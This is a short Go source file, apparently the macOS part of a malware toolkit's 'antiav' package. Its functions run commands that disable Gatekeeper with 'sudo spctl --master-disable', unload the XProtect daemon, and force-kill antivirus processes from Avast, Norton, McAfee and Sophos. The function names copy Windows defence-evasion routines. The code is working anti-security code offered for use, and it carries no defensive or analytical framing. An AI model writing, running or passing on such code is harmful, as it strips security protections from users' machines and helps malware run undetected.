//go:build darwin

package antiav

import (
    "os/exec"
)

// Darwin: disable Gatekeeper and XProtect via spctl (requires sudo, best-effort)
func DisableUAC() {
    exec.Command("sudo", "spctl", "--master-disable").Run()
}

func DisableWDInitiate() {
    // XProtect no direct disable, try to unload
    exec.Command("sudo", "launchctl", "unload", "/System/Library/LaunchDaemons/com.apple.XProtect.daemon.plist").Run()
}

func AvProcs() {
    // Kill common macOS AV processes best-effort
    av := []string{"Avast", "Norton", "McAfee", "Sophos"}
    for _, p := range av {
        exec.Command("killall", "-9", p).Run()
    }
}
